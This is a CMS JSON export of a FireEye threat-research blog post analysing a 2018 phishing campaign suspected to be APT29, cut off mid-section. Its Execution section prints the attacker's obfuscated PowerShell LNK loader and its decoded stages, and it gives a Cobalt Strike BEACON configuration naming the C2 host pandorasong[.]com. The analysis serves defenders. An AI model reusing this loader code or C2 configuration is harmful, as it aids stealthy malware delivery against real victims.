{
  "jcr:primaryType": "cq:Page",
  "jcr:createdBy": "admin",
  "jcr:created": "Mon Nov 19 2018 17:01:55 GMT-0500",
  "jcr:content": {
    "jcr:primaryType": "cq:PageContent",
    "jcr:mixinTypes": [
      "mix:versionable"
    ],
    "jcr:createdBy": "admin",
    "jcr:title": "Not So Cozy: An Uncomfortable Examination of a Suspected APT29 Phishing Campaign",
    "cq:lastReplicationAction": "Activate",
    "jcr:versionHistory": "5e15eebf-f32b-48d3-81e3-24e1fd4376bd",
    "author": "Matthew Dunwoody ",
    "cq:template": "\/apps\/fireeye-blog\/templates\/page_blogpost",
    "cq:lastReplicatedBy": "adam.greenberg@fireeye.com",
    "jcr:language": "en_us",
    "jcr:predecessors": [
      "813e5c13-c6d4-4070-a975-8e3616e7e98a"
    ],
    "jcr:created": "Mon Nov 19 2018 17:23:26 GMT-0500",
    "cq:lastReplicated": "Mon Nov 19 2018 17:23:26 GMT-0500",
    "cq:lastModified": "Mon Nov 19 2018 17:22:59 GMT-0500",
    "jcr:baseVersion": "813e5c13-c6d4-4070-a975-8e3616e7e98a",
    "jcr:isCheckedOut": true,
    "cq:tags": [
      "fireeye-blog-authors:matthew-dunwoody",
      "fireeye-blog-authors:andrew-thompson",
      "fireeye-blog-authors:ben-withnell",
      "fireeye-blog-authors:jonathan-leathery",
      "fireeye-blog-authors:michael-matonis",
      "fireeye-blog-authors:nick-carr",
      "fireeye-blog-threat-research:threat-research",
      "fireeye-blog-tags:apt",
      "fireeye-blog-tags:homepage-carousel",
      "fireeye-blog-tags:latest",
      "fireeye-blog-tags:phishing",
      "fireeye-blog-tags:spear-phishing"
    ],
    "jcr:uuid": "b31d6980-d55b-488f-a19e-4ea530425293",
    "sling:resourceType": "social\/blog\/components\/page",
    "published": "Mon Nov 19 2018 17:00:00 GMT-0500",
    "cq:lastModifiedBy": "adam.greenberg@fireeye.com",
    "par": {
      "jcr:primaryType": "nt:unstructured",
      "sling:resourceType": "foundation\/components\/parsys",
      "entry": {
        "jcr:primaryType": "nt:unstructured",
        "jcr:lastModifiedBy": "adam.greenberg@fireeye.com",
        "text": "\u003Ch4\u003EIntroduction\u003C\/h4\u003E\n\u003Cul style=\u0022list-style-position: inside;\u0022\u003E\n\u003Cli\u003EFireEye devices detected intrusion attempts against multiple industries, including think tank, law enforcement, media, U.S. military, imagery, transportation, pharmaceutical, national government, and defense contracting.\u003C\/li\u003E\n\u003Cli\u003EThe attempts involved a phishing email appearing to be from the U.S. Department of State with links to zip files containing malicious Windows shortcuts that delivered Cobalt Strike Beacon.\u003C\/li\u003E\n\u003Cli\u003EShared technical artifacts; tactics, techniques, and procedures (TTPs); and targeting connect this activity to previously observed activity suspected to be APT29.\u003C\/li\u003E\n\u003Cli\u003EAPT29 is known to transition away from phishing implants within hours of initial compromise.\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Cp\u003EOn November 14, 2018, FireEye detected new targeted phishing activity at more than 20 of our clients across multiple industries.\u003C\/p\u003E\n\u003Cblockquote class=\u0022twitter-tweet tw-align-center\u0022 data-lang=\u0022en\u0022\u003E\u003Cp lang=\u0022en\u0022 dir=\u0022ltr\u0022\u003E(UPDATE) This campaign has targeted over 20 FireEye customers across: Defense, Imagery, Law Enforcement, Local Government, Media, Military, Pharmaceutical, Think Tank, Transportation, \u0026amp; US Public Sector industries in multiple geographic regions.\u003C\/p\u003E\u0026mdash; FireEye (@FireEye) \u003Ca href=\u0022https:\/\/twitter.com\/FireEye\/status\/1063183956575748096?ref_src=twsrc%5Etfw\u0022\u003ENovember 15, 2018\u003C\/a\u003E\u003C\/blockquote\u003E\n\u003Cscript async src=\u0022https:\/\/platform.twitter.com\/widgets.js\u0022 charset=\u0022utf-8\u0022\u003E\u003C\/script\u003E\n\u003Cp style=\u0022text-align: left;\u0022\u003EThe attacker appears to have compromised the email server of a hospital and the corporate website of a consulting company in order to use their infrastructure to send phishing emails. The phishing emails were made to look like secure communication from a Public Affairs official at the U.S. Department of State, hosted on a page made to look like another Department of State Public Affairs official\u0027s personal drive, and used a legitimate Department of State form as a decoy. This information could be obtained via publicly available data, and there is no indication that the Department of State network was involved in this campaign. The attacker used unique links in each phishing email and the links that FireEye observed were used to download a ZIP archive that contained a weaponized Windows shortcut file, launching both a benign decoy document and a Cobalt Strike Beacon backdoor, customized by the attacker to blend in with legitimate network traffic.\u003C\/p\u003E\n\u003Cp style=\u0022text-align: left;\u0022\u003ESeveral elements from this campaign \u2013 including the resources invested in the phishing email and\u0026nbsp;network infrastructure, the\u0026nbsp;metadata\u0026nbsp;from the weaponized shortcut file payload, and the specific victim individuals and organizations targeted \u2013 are directly linked to the last observed APT29 phishing campaign from November 2016. This blog post explores those\u0026nbsp;technical breadcrumbs and the possible intentions of this\u0026nbsp;activity.\u003C\/p\u003E\n\u003Ch4 style=\u0022text-align: left;\u0022\u003EAttribution Challenges\u003C\/h4\u003E\n\u003Cp style=\u0022text-align: left;\u0022\u003EConclusive FireEye attribution is often obtained through our Mandiant consulting team\u0027s investigation of incidents at compromised organizations, to identify details of the attack and post-compromise activity at victims. FireEye is still analyzing this activity.\u003C\/p\u003E\n\u003Cp style=\u0022text-align: left;\u0022\u003EThere are several similarities and technical overlaps between the 14 November 2018, phishing campaign and the suspected APT29 phishing campaign on 9 November 2016, both of which occurred shortly after U.S. elections. However, the new campaign included creative new elements as well as a seemingly deliberate reuse of old phishing tactics, techniques and procedures (TTPs), including using the same system to weaponize a Windows shortcut (LNK) file. APT29 is a sophisticated actor, and while sophisticated actors are not infallible, seemingly blatant mistakes are cause for pause when considering historical uses of deception by Russian intelligence services. It has also been over a year since we have conclusively identified APT29 activity, which raises questions about the timing and the similarities of the activity after such a long interlude.\u003C\/p\u003E\n\u003Cp style=\u0022text-align: left;\u0022\u003ENotable similarities between this and the 2016 campaign include the Windows shortcut metadata, targeted organizations and specific individuals, phishing email construction, and the use of compromised infrastructure. Notable differences include the use of Cobalt Strike, rather than custom malware; however, many espionage actors do use publicly and commercially available frameworks for reasons such as plausible deniability.\u003C\/p\u003E\n\u003Cp style=\u0022text-align: left;\u0022\u003EDuring the phishing campaign, there were indications that the site hosting the malware was selectively serving payloads. For example, requests using incorrect HTTP headers \u003Ca href=\u0022https:\/\/twitter.com\/TheCyberSecExp\/status\/1063477661169827846\u0022\u003Ereportedly\u003C\/a\u003E served ZIP archives containing only the benign publicly available Department of State form. It is possible that the threat actor served additional and different payloads depending on the link visited; however, FireEye has only observed two: the benign and Cobalt Strike variations.\u003C\/p\u003E\n\u003Cp style=\u0022text-align: left;\u0022\u003EWe provide details of this in the activity summary. Analysis of the campaign is ongoing, and we welcome any additional information from the community.\u003C\/p\u003E\n\u003Ch4 style=\u0022text-align: left;\u0022\u003EActivity Summary\u003C\/h4\u003E\n\u003Cp style=\u0022text-align: left;\u0022\u003EThe threat actor crafted the phishing emails to masquerade as a U.S. Department of State Public Affairs official sharing an official document. The links led to a ZIP archive that contained a weaponized Windows shortcut file hosted on a likely compromised legitimate domain, jmj[.].com. The shortcut file was crafted to execute a PowerShell command that read, decoded, and executed additional code from within the shortcut file.\u003C\/p\u003E\n\u003Cp style=\u0022text-align: left;\u0022\u003EUpon execution, the shortcut file dropped a benign, publicly available, U.S. Department of State form and Cobalt Strike Beacon. Cobalt Strike is a commercially available post-exploitation framework. The BEACON payload was configured with a modified variation of the publicly available \u003Ca href=\u0022https:\/\/github.com\/rsmudge\/Malleable-C2-Profiles\/blob\/master\/normal\/pandora.profile\u0022\u003E\u0026quot;Pandora\u0026quot; Malleable C2 Profile\u003C\/a\u003E and used a command and control (C2) domain \u2013 pandorasong[.]com \u2013 assessed to be a masquerade of the Pandora music streaming service. The customization of the C2 profile may have been intended to defeat less resilient network detection methods dependent on the default configurations. The shortcut metadata indicates it was built on the same or very similar system as the shortcut used in the November 2016 campaign. The decoy content is shown in Figure 1.\u003C\/p\u003E\n\u003Cp style=\u0022text-align: left;\u0022\u003E\u003Cimg src=\u0022\/content\/dam\/fireeye-www\/blog\/images\/NovAPT29cpe\/Picture1.png\u0022\u003E\u003Cbr\u003E\n\u003Cspan class=\u0022type-XS\u0022\u003EFigure 1: Decoy document content\u003C\/span\u003E\u003C\/p\u003E\n\u003Ch4 style=\u0022text-align: left;\u0022\u003ESimilarities to Older Activity\u003C\/h4\u003E\n\u003Cp style=\u0022text-align: left;\u0022\u003EThis activity has TTP and targeting overlap with previous activity, suspected to be APT29. The malicious LNK used in the recent spearphishing campaign, \u003Cspan class=\u0022code\u0022\u003Eds7002.lnk\u003C\/span\u003E (MD5: 6ed0020b0851fb71d5b0076f4ee95f3c), has technical overlaps with a suspected APT29 LNK from November 2016, \u003Cspan class=\u0022code\u0022\u003E37486-the-shocking-truth-about-election-rigging-in-america.rtf.lnk\u003C\/span\u003E (MD5: f713d5df826c6051e65f995e57d6817d), which was publicly reported by \u003Ca href=\u0022https:\/\/www.volexity.com\/blog\/2016\/11\/09\/powerduke-post-election-spear-phishing-campaigns-targeting-think-tanks-and-ngos\/\u0022\u003EVolexity\u003C\/a\u003E. The 2018 and 2016 LNK files are similar in structure and code, and contain significant metadata overlap, including the MAC address of the system on which the LNK was created.\u003C\/p\u003E\n\u003Cp style=\u0022text-align: left;\u0022\u003EAdditional overlap was observed in the targeting and tactics employed in the phishing campaigns responsible for distributing these LNK file. Previous APT29 activity targeted some of the same recipients of this email campaign, and APT29 has leveraged large waves of emails in previous campaigns.\u003C\/p\u003E\n\u003Ch4 style=\u0022text-align: left;\u0022\u003EOutlook and Implications\u003C\/h4\u003E\n\u003Cp style=\u0022text-align: left;\u0022\u003EAnalysis of this activity is ongoing, but if the APT29 attribution is strengthened, it would be the first activity uncovered from this sophisticated group in at least a year. Given the widespread nature of the targeting, organizations that have previously been targeted by APT29 should take note of this activity. For network defenders, whether or not this activity was conducted by APT29 should be secondary to properly investigating the full scope of the intrusion, which is of critical importance if the elusive and deceptive APT29 operators indeed had access to your environment. \u0026nbsp;\u003C\/p\u003E\n\u003Ch3 style=\u0022text-align: left;\u0022\u003ETechnical Details\u003C\/h3\u003E\n\u003Ch4 style=\u0022text-align: left;\u0022\u003EPhishing\u003C\/h4\u003E\n\u003Cp style=\u0022text-align: left;\u0022\u003EEmails were sent from \u003Cspan class=\u0022code\u0022\u003EDOSOneDriveNotifications-svCT-Mailboxe36625aaa85747214aa50342836a2315aaa36928202aa46271691a8255aaa15382822aa25821925a0245@northshorehealthgm[.]org\u003C\/span\u003E with the subject \u003Cspan class=\u0022code\u0022\u003EStevenson, Susan N shared \u0026quot;TP18-DS7002 (UNCLASSIFIED)\u0026quot; with you\u003C\/span\u003E. The distribution of emails varied significantly between the affected organizations. While most targeted FireEye customers received three or fewer emails, some received significantly more, with one customer receiving 136.\u003C\/p\u003E\n\u003Cp style=\u0022text-align: left;\u0022\u003EEach phishing email contained a unique malicious URL, likely for tracking victim clicks. The pattern of this URL is shown in Figure 2.\u003C\/p\u003E\n\u003Cp style=\u0022text-align: left;\u0022\u003E\u003Cimg src=\u0022\/content\/dam\/fireeye-www\/blog\/images\/NovAPT29cpe\/Picture2.png\u0022\u003E\u003Cbr\u003E\n\u003Cspan class=\u0022type-XS\u0022\u003EFigure 2: Malicious URL structure\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp style=\u0022text-align: left;\u0022\u003EOutside of the length of the sender email address, which may have been truncated on some recipient email clients, the attacker made little effort to hide the true source of the emails, including that they were not actually sent from the Department of State. Figure 3 provides a redacted snapshot of email headers from the phishing message.\u003C\/p\u003E\n\u003Cp style=\u0022text-align: left;\u0022\u003E\u003Cimg src=\u0022\/content\/dam\/fireeye-www\/blog\/images\/NovAPT29cpe\/Picture3.png\u0022\u003E\u003Cbr\u003E\n\u003Cspan class=\u0022type-XS\u0022\u003EFigure 3: Redacted email headers\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp style=\u0022text-align: left;\u0022\u003EThe malicious links are known to have served two variants of the file \u003Cspan class=\u0022code\u0022\u003Eds7002.zip\u003C\/span\u003E. The first variant (MD5: 3fccf531ff0ae6fedd7c586774b17a2d), contained \u003Cspan class=\u0022code\u0022\u003Eds7002.lnk\u003C\/span\u003E (MD5: 6ed0020b0851fb71d5b0076f4ee95f3c). \u003Cspan class=\u0022code\u0022\u003Eds7002.lnk\u003C\/span\u003E was a malicious shortcut (LNK) file that contained an embedded BEACON DLL and decoy PDF, and was crafted to launch a PowerShell command. On execution, the PowerShell command extracted and executed the Cobalt Strike BEACON backdoor and decoy PDF. The other observed variant of ds7002.zip (MD5: 658c6fe38f95995fa8dc8f6cfe41df7b) contained only the benign decoy document. The decoy document \u003Cspan class=\u0022code\u0022\u003Eds7002.pdf\u003C\/span\u003E (MD5: 313f4808aa2a2073005d219bc68971cd) appears to have been downloaded from hxxps:\/\/eforms.state.gov\/Forms\/ds7002.PDF.\u003C\/p\u003E\n\u003Cp style=\u0022text-align: left;\u0022\u003EThe BEACON backdoor communicated with the C2 domain \u003Cspan class=\u0022code\u0022\u003Epandorasong[.]com (95.216.59[.]92)\u003C\/span\u003E. The domain leveraged privacy protection, but had a start of authority (SOA) record containing \u003Cspan class=\u0022code\u0022\u003Evleger@tutanota.com\u003C\/span\u003E.\u003C\/p\u003E\n\u003Cp style=\u0022text-align: left;\u0022\u003EOur analysis indicates that the attacker started configuring infrastructure approximately 30 days prior to the attack. This is a significantly longer delay than many other attackers we track. Table 1 contains a timeline of this activity.\u003C\/p\u003E\n\u003Ctable border=\u00221\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd width=\u0022146\u0022 valign=\u0022top\u0022\u003E\u003Cp style=\u0022text-align: left;\u0022\u003E\u003Cb\u003ETime\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022292\u0022 valign=\u0022top\u0022\u003E\u003Cp style=\u0022text-align: left;\u0022\u003E\u003Cb\u003EEvent\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022186\u0022 valign=\u0022top\u0022\u003E\u003Cp style=\u0022text-align: left;\u0022\u003E\u003Cb\u003ESource\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022146\u0022 valign=\u0022top\u0022\u003E\u003Cp style=\u0022text-align: left;\u0022\u003E2018-10-15 15:35:19Z\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022292\u0022 valign=\u0022top\u0022\u003E\u003Cp style=\u0022text-align: left;\u0022\u003Epandorasong[.]com registered\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022186\u0022 valign=\u0022top\u0022\u003E\u003Cp style=\u0022text-align: left;\u0022\u003ERegistrant Information\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022146\u0022 valign=\u0022top\u0022\u003E\u003Cp style=\u0022text-align: left;\u0022\u003E2018-10-15 17:39:00Z\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022292\u0022 valign=\u0022top\u0022\u003E\u003Cp style=\u0022text-align: left;\u0022\u003Epandorasong[.]com SSL certificate established\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022186\u0022 valign=\u0022top\u0022\u003E\u003Cp style=\u0022text-align: left;\u0022\u003ECertificate Transparency\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022146\u0022 valign=\u0022top\u0022\u003E\u003Cp style=\u0022text-align: left;\u0022\u003E2018-10-15 18:52:06Z\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022292\u0022 valign=\u0022top\u0022\u003E\u003Cp style=\u0022text-align: left;\u0022\u003ECobalt Strike server established\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022186\u0022 valign=\u0022top\u0022\u003E\u003Cp style=\u0022text-align: left;\u0022\u003EScan Data\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022146\u0022 valign=\u0022top\u0022\u003E\u003Cp style=\u0022text-align: left;\u0022\u003E2018-11-02 10:25:58Z\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022292\u0022 valign=\u0022top\u0022\u003E\u003Cp style=\u0022text-align: left;\u0022\u003ELNK Weaponized\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022186\u0022 valign=\u0022top\u0022\u003E\u003Cp style=\u0022text-align: left;\u0022\u003ELNK Metadata\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022146\u0022 valign=\u0022top\u0022\u003E\u003Cp style=\u0022text-align: left;\u0022\u003E2018-11-13 17:58:41Z\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022292\u0022 valign=\u0022top\u0022\u003E\u003Cp style=\u0022text-align: left;\u0022\u003E3fccf531ff0ae6fedd7c586774b17a2d modified\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022186\u0022 valign=\u0022top\u0022\u003E\u003Cp style=\u0022text-align: left;\u0022\u003EArchive Metadata\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022146\u0022 valign=\u0022top\u0022\u003E\u003Cp style=\u0022text-align: left;\u0022\u003E2018-11-14 01:48:34Z\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022292\u0022 valign=\u0022top\u0022\u003E\u003Cp style=\u0022text-align: left;\u0022\u003E658c6fe38f95995fa8dc8f6cfe41df7b modified\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022186\u0022 valign=\u0022top\u0022\u003E\u003Cp style=\u0022text-align: left;\u0022\u003EArchive Metadata\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022146\u0022 valign=\u0022top\u0022\u003E\u003Cp style=\u0022text-align: left;\u0022\u003E2018-11-14 08:23:10Z\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022292\u0022 valign=\u0022top\u0022\u003E\u003Cp style=\u0022text-align: left;\u0022\u003EFirst observed phishing e-mail sent\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022186\u0022 valign=\u0022top\u0022\u003E\u003Cp style=\u0022text-align: left;\u0022\u003ETelemetry\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp style=\u0022text-align: left;\u0022\u003E\u003Cspan class=\u0022type-XS\u0022\u003ETable 1: Operational timeline\u003C\/span\u003E\u003C\/p\u003E\n\u003Ch4 style=\u0022text-align: left;\u0022\u003EExecution\u003C\/h4\u003E\n\u003Cp style=\u0022text-align: left;\u0022\u003EUpon execution of the malicious LNK, \u003Cspan class=\u0022code\u0022\u003Eds7002.lnk\u003C\/span\u003E (MD5: 6ed0020b0851fb71d5b0076f4ee95f3c), the following PowerShell command was executed:\u003C\/p\u003E\n\u003Cp style=\u0022text-align: left;\u0022\u003E\u003Cspan class=\u0022code\u0022\u003E\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noni -ep bypass\u003Cbr\u003E\n $zk=\u0027JHB0Z3Q9MHgwMDA1ZTJiZTskdmNxPTB4MDAwNjIzYjY7JHRiPSJkczcwMDIubG5\u003Cbr\u003E\n rIjtpZiAoLW5vdChUZXN0LVBhdGggJHRiKSl7JG9lPUdldC1DaGlsZEl0ZW0gLVBhdGggJE\u003Cbr\u003E\n Vudjp0ZW1wIC1GaWx0ZXIgJHRiIC1SZWN1cnNlO2lmICgtbm90ICRvZSkge2V4aXR9W\u003Cbr\u003E\n 0lPLkRpcmVjdG9yeV06OlNldEN1cnJlbnREaXJlY3RvcnkoJG9lLkRpcmVjdG9yeU5hbWUp\u003Cbr\u003E\n O30kdnp2aT1OZXctT2JqZWN0IElPLkZpbGVTdHJlYW0gJHRiLCdPcGVuJywnUmVhZCcsJ\u003Cbr\u003E\n 1JlYWRXcml0ZSc7JG9lPU5ldy1PYmplY3QgYnl0ZVtdKCR2Y3EtJHB0Z3QpOyRyPSR2en\u003Cbr\u003E\n ZpLlNlZWsoJHB0Z3QsW0lPLlNlZWtPcmlnaW5dOjpCZWdpbik7JHI9JHZ6dmkuUmVhZC\u003Cbr\u003E\n gkb2UsMCwkdmNxLSRwdGd0KTskb2U9W0NvbnZlcnRdOjpGcm9tQmFzZTY0Q2hhckFy\u003Cbr\u003E\n cmF5KCRvZSwwLCRvZS5MZW5ndGgpOyR6az1bVGV4dC5FbmNvZGluZ106OkFTQ0lJL\u003Cbr\u003E\n kdldFN0cmluZygkb2UpO2lleCAkems7\u0027;$fz=\u0027FromBase\u0027+0x40+\u0027String\u0027;$rhia=[Text.E\u003Cbr\u003E\n ncoding]::ASCII.GetString([Convert]::$fz.Invoke($zk));iex $rhia;\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp style=\u0022text-align: left;\u0022\u003EThis command included some specific obfuscation, which may indicate attempts to bypass specific detection logic. For example, the use of \u003Cspan class=\u0022code\u0022\u003E\u0027FromBase\u0027+0x40+\u0027String\u0027\u003C\/span\u003E, in place of FromBase64String, the PowerShell command used to decode base64.\u003C\/p\u003E\n\u003Cp style=\u0022text-align: left;\u0022\u003EThe decoded command consisted of additional PowerShell that read the content of \u003Cspan class=\u0022code\u0022\u003Eds7002.lnk\u003C\/span\u003E from offset \u003Cspan class=\u0022code\u0022\u003E0x5e2be\u003C\/span\u003E to offset \u003Cspan class=\u0022code\u0022\u003E0x623b6\u003C\/span\u003E, base64 decoded the extracted content, and executed it as additional PowerShell content. The embedded PowerShell code decoded to the following:\u003C\/p\u003E\n\u003Cp style=\u0022text-align: left;\u0022\u003E\u003Cspan class=\u0022code\u0022\u003E$ptgt=0x0005e2be;\u003Cbr\u003E\n $vcq=0x000623b6;\u003Cbr\u003E\n $tb=\u0026quot;ds7002.lnk\u0026quot;;\u003Cbr\u003E\n if (-not(Test-Path $tb))\u003Cbr\u003E\n {\u003Cbr\u003E\n $oe=Get-ChildItem -Path $Env:temp -Filter $tb -Recurse;\u003Cbr\u003E\n if (-not $oe)\u003Cbr\u003E\n {\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp;exit\u003Cbr\u003E\n }\u003Cbr\u003E\n [IO.Directory]::SetCurrentDirectory($oe.DirectoryName);\u003Cbr\u003E\n }\u003Cbr\u003E\n $vzvi=New-Object IO.FileStream $tb,\u0027Open\u0027,\u0027Read\u0027,\u0027ReadWrite\u0027;\u003Cbr\u003E\n $oe=New-Object byte[]($vcq-$ptgt);\u003Cbr\u003E\n $r=$vzvi.Seek($ptgt,[IO.SeekOrigin]::Begin);\u003Cbr\u003E\n $r=$vzvi.Read($oe,0,$vcq-$ptgt);\u003Cbr\u003E\n $oe=[Convert]::FromBase64CharArray($oe,0,$oe.Length);\u003Cbr\u003E\n $zk=[Text.Encoding]::ASCII.GetString($oe);\u003Cbr\u003E\n iex $zk;\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp style=\u0022text-align: left;\u0022\u003EWhen the decoded PowerShell is compared to the older 2016 PowerShell embedded loader (Figure 4), it\u0027s clear that similarities still exist. However, the new activity leverages randomized variable and function names, as well as obfuscating strings contained in the script.\u003C\/p\u003E\n\u003Cp style=\u0022text-align: left;\u0022\u003E\u003Cimg src=\u0022\/content\/dam\/fireeye-www\/blog\/images\/NovAPT29cpe\/Picture4.png\u0022\u003E\u003Cbr\u003E\n\u003Cspan class=\u0022type-XS\u0022\u003EFigure 4: Shared functions to loader in older activity (XOR decode function and CopyFilePart)\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp style=\u0022text-align: left;\u0022\u003EThe PowerShell loader code is obfuscated, but a short de-obfuscated snippet is shown as follows. The decoy PDF and BEACON loader DLL are read from specific offsets within the LNK, decoded, and their contents executed. The BEACON loader DLL is executed with the export function \u0026quot;PointFunctionCall\u0026quot;:\u003C\/p\u003E\n\u003Cp style=\u0022text-align: left;\u0022\u003E[TRUNCATED]\u003Cbr\u003E\n\u003Cspan class=\u0022code\u0022\u003E$jzffhy = [IO.FileAccess]::READ\u003Cbr\u003E\n $gibisec = myayxvj $(\u0026quot;ds7002.lnk\u0026quot;)\u003Cbr\u003E\n $oufgke = 0x48bd8\u003Cbr\u003E\n $wabxu = 0x5e2be - $oufgke\u003Cbr\u003E\n $lblij = bygtqi $gibisec $oufgke $wabxu $(\u0026quot;%TEMP%\\ds7002.PDF\u0026quot;) Invoke-Item\u003Cbr\u003E\n $((lylyvve @((7,(30 + 0x34 - 3),65,(84 - 5),(-38 + 112),(-16 + 0x25 + 52))) 35))\u003Cbr\u003E\n $oufgke = 0x0dd8\u003Cbr\u003E\n $wabxu = 0x48bd8 - $oufgke\u003Cbr\u003E\n $yhcgpw = bygtqi $gibisec $oufgke $wabxu $(\u0026quot;%LOCALAPPDATA%\\cyzfc.dat\u0026quot;) if\u003Cbr\u003E\n ($ENV:PROCESSOR_ARCHITECTURE -eq $(\u0026quot;AMD64\u0026quot;)) { \u0026amp; ($(\u0026quot;rundll32.exe\u0026quot;)) $(\u0026quot;,\u0026quot;)\u003Cbr\u003E\n $(\u0026quot;PointFunctionCall\u0026quot;) }\u003C\/span\u003E\u003C\/p\u003E\n\u003Ch4 style=\u0022text-align: left;\u0022\u003EFiles Dropped\u003C\/h4\u003E\n\u003Cp style=\u0022text-align: left;\u0022\u003EUpon successful execution of the LNK file, it dropped the following files to the victim\u0027s system:\u003C\/p\u003E\n\u003Cul style=\u0022list-style-position: inside;\u0022\u003E\n\u003Cli style=\u0022text-align: left;\u0022\u003E\u003Cspan class=\u0022code\u0022\u003E%APPDATA%\\Local\\cyzfc.dat\u003C\/span\u003E (MD5: 16bbc967a8b6a365871a05c74a4f345b)\u003Cul\u003E\n\u003Cli style=\u0022text-align: left;\u0022\u003EBEACON loader DLL\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003C\/li\u003E\n\u003Cli style=\u0022text-align: left;\u0022\u003E\u003Cspan class=\u0022code\u0022\u003E%TEMP%\\ds7002.PDF\u003C\/span\u003E (MD5: 313f4808aa2a2073005d219bc68971cd)\u003Cul\u003E\n\u003Cli style=\u0022text-align: left;\u0022\u003EDecoy document\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Cp style=\u0022text-align: left;\u0022\u003EThe dropped BEACON loader DLL was executed by RunDll32.exe using the export function \u0026quot;PointFunctionCall\u0026quot;:\u003C\/p\u003E\n\u003Cp style=\u0022text-align: left;\u0022\u003E\u003Cspan class=\u0022code\u0022\u003E\u0026quot;C:\\Windows\\system32\\rundll32.exe\u0026quot; \u003Cbr\u003E\n C:\\Users\\Administrator\\AppData\\Local\\cyzfc.dat, PointFunctionCall\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp style=\u0022text-align: left;\u0022\u003EThe BEACON payload included the following configuration:\u003C\/p\u003E\n\u003Cp style=\u0022text-align: left;\u0022\u003E\u003Cspan class=\u0022code\u0022\u003Eauthorization_id: 0x311168c\u003Cbr\u003E\n dns_sleep: 0\u003Cbr\u003E\n http_headers_c2_post_req:\u003Cbr\u003E\n \u0026nbsp; Accept: *\/*\u003Cbr\u003E\n \u0026nbsp; Content-Type: text\/xml\u003Cbr\u003E\n \u0026nbsp; X-Requested-With: XMLHttpRequest\u003Cbr\u003E\n \u0026nbsp; Host: pandorasong.com\u003Cbr\u003E\n http_headers_c2_request:\u003Cbr\u003E\n \u0026nbsp; Accept: *\/*\u003Cbr\u003E\n \u0026nbsp; GetContentFeatures.DLNA.ORG: 1\u003Cbr\u003E\n \u0026nbsp; Host: pandorasong[.]com\u003Cbr\u003E\n \u0026nbsp; Cookie:\u0026nbsp; __utma=310066733.2884534440.1433201462.1403204372.1385202498.7;\u003Cbr\u003E\n jitter: 17\u003Cbr\u003E\n named_pipes: \\\\\\\\%s\\\\pipe\\\\msagent_%x\u003Cbr\u003E\n process_inject_targets:\u003Cbr\u003E\n \u0026nbsp; %windir%\\\\syswow64\\\\rundll32.exe\u003Cbr\u003E\n \u0026nbsp; %windir%\\\\sysnative\\\\rundll32.exe\u003Cbr\u003E\n beacon_interval: 300\u003Cbr\u003E\n c2:\u003Cbr\u003E\n \u0026nbsp; conntype: SSL\u003Cbr\u003E\n \u0026nbsp; host: pandorasong[.]com\u003Cbr\u003E\n \u0026nbsp; port: 443\u003Cbr\u003E\n c2_urls:\u003Cbr\u003E\n \u0026nbsp; pandorasong[.]com\/radio\/xmlrpc\/v45\u003Cbr\u003E\n \u0026nbsp; pandorasong[.]com\/access\/\u003Cbr\u003E\n c2_user_agents: Mozilla\/5.0 (Windows NT 10.0; WOW64; Trident\/7.0; rv:11.0) like Gecko\u003C\/span\u003E\u003C\/p\u003E\n\u003Ch4 style=\u0022text-align: left;\u0022\u003ENetwork Communications\u003C\/h4\u003E\n\u003Cp style=\u0022text-align: left;\u0022\u003EAfter successful installation\/initialization of the malware, it made the following callback to the C2 server pandorasong[.]com via TCP\/443 SSL. The sample was configured to use a \u003Ca href=\u0022https:\/\/www.cobaltstrike.com\/help-malleable-c2\u0022\u003Emalleable C2 profile for its network communications\u003C\/a\u003E. The specific profile used appears to be a modified version of the \u003Ca 